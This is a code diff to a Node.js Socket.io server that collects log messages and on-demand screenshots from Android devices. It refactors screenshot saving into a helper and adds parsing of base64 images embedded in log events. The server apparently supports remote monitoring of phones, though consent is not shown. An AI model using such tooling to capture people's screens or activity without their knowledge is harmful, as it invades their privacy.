@@ -42,6 +42,33 @@ function cleanupExpiredScreenshotRequests() {
 // Clean up expired requests every 10 seconds
 setInterval(cleanupExpiredScreenshotRequests, 10000);
 
+/**
+ * Helper function to save a screenshot image to disk
+ * @param {Buffer} imageBuffer - The image data as Buffer
+ * @param {string} deviceUuid - The device UUID
+ * @returns {Promise<string>} - The filename if successful, null otherwise
+ */
+async function saveScreenshot(imageBuffer, deviceUuid) {
+    try {
+        if (!imageBuffer || imageBuffer.length === 0) {
+            return null;
+        }
+        
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
+        const filepath = `screenshots/${filename}`;
+        
+        await fs.mkdir('screenshots', { recursive: true });
+        await fs.writeFile(filepath, imageBuffer);
+        
+        console.log(`Screenshot saved: screenshots/${filename}`);
+        return filename;
+    } catch (error) {
+        console.error('Error saving screenshot:', error);
+        return null;
+    }
+}
+
 // Socket.io server
 const io = new Server(serverPort, {
     cors: {
@@ -201,18 +228,46 @@ androidIo.on("connection", async (socket) => {
                     return;
                 }
 
-                device.logs.push({ timestamp: Date.now(), log: data });
+                // Update device last seen
                 device.lastSeen = Date.now();
 
-                // Emit to frontend
-                frontendIo.emit("logger", { device: deviceUuid, log: data });
+                // Check if message contains embedded image (format: text<<IMAGE>>base64)
+                let logText = data;
+                let embeddedImageFilename = null;
+                
+                if (data && typeof data === 'string' && data.includes('<<IMAGE>>')) {
+                    const parts = data.split('<<IMAGE>>');
+                    logText = parts[0];
+                    const embeddedImage = parts[1];
+                    
+                    console.log(chalk.green(`[i] Logger event with embedded image from device ${deviceUuid}`));
+                    
+                    // Save the embedded image using helper function
+                    if (embeddedImage && embeddedImage.length > 0) {
+                        const buffer = Buffer.from(embeddedImage, 'base64');
+                        embeddedImageFilename = await saveScreenshot(buffer, deviceUuid);
+                    }
+                }
+
+                // Determine what to store in logs and emit to frontend
+                if (embeddedImageFilename) {
+                    device.logs.push({ timestamp: Date.now(), log: logText, image: embeddedImageFilename });
+                    frontendIo.emit("logger", { 
+                        device: deviceUuid, 
+                        log: logText,
+                        image: embeddedImageFilename
+                    });
+                } else {
+                    device.logs.push({ timestamp: Date.now(), log: data });
+                    frontendIo.emit("logger", { device: deviceUuid, log: data });
+                }
 
                 // Store in DB
                 const today = new Date().toISOString().split('T')[0];
                 const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
                 let existingLogs = row?.logs_data || '[]';
                 const logsArray = JSON.parse(existingLogs);
-                logsArray.push({ timestamp: Date.now(), log: data });
+                logsArray.push({ timestamp: Date.now(), log: logText });
 
                 await db.run(
                     'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
@@ -251,13 +306,11 @@ androidIo.on("connection", async (socket) => {
                     device.lastSeen = Date.now();
                 }
 
-                // Generate filename and save
-                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
-                const filepath = `screenshots/${filename}`;
-
-                await fs.mkdir('screenshots', { recursive: true });
-                await fs.writeFile(filepath, buffer);
+                // Save screenshot using helper function
+                const filename = await saveScreenshot(buffer, deviceUuid);
+                if (!filename) {
+                    throw new Error('Failed to save screenshot');
+                }
 
                 // Handle screenshot response
                 const request = pendingScreenshots.get(deviceUuid);
